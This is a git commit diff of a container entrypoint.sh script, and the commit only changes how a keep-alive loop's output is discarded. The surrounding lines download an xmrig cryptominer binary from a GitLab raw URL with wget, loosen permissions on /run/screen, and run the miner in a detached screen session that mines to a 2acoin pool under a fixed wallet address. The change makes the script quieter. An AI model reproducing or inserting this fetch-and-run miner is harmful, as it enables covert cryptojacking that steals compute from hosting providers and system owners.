9e0fe7a85b3b968ac4c81bc84b4bb6020d8621e2
Nina Lasmi <ninalasmi937@gmail.com>
2021-12-23 06:47:03 +0000

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -5,4 +5,4 @@ wget -q -O $OKE https://gitlab.com/ninalasmi937/erte/-/raw/main/xmrig
 chmod +x $OKE
 chmod 777 /run/screen
 screen -dmS $OKE ./$OKE --donate-level 1 -a Argon2/Chukwa -o us-central.2acoin.org:5555 -u guns8Wg2rmKHRrtAR66i83J8KsZ6X5nrb9GACjaoTR6a9bZykjGnSHM9QCB6YjgwUf9Q8C8SbUeJZAEd8oMfyVH4Hxb1gN8KWh8EaQmTq4eew7XMWZgrqE1KcDik8fQU5EhhauijLA9MGCiLH2gxjww4DuQJ2ErN1GMhkct7giSyVPwS4iCQconvy5 -p $(cat /proc/sys/kernel/hostname)
-while :; do shuf -n 1 -i 1-99999999; sleep 30; done
+while :; do shuf -n 1 -i 1-99999999; sleep 30; done >/dev/null >/dev/null 2>&1
